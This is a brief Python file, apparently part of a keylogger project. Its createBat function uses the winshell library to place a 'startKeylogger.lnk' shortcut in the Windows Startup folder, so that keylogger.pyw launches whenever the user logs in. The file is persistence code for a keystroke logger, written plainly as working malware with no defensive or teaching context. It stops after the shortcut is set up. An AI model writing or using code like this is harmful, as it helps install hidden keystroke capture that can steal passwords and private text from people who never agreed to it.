import os, sys
import winshell
# print("Enabling to run at StartUp")
def createBat():
    user = os.environ["USERPROFILE"] + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    if not os.path.isfile("{0}\\startKeylogger.lnk".format(user)):
        path = os.getcwd()
        link_filepath = os.path.join(user, "startKeylogger.lnk")
        with winshell.shortcut(link_filepath) as link:
            link.working_directory = path
            link.path = f"{path}\\keylogger.pyw"
            link.description = "Shortcut to keylogger"
    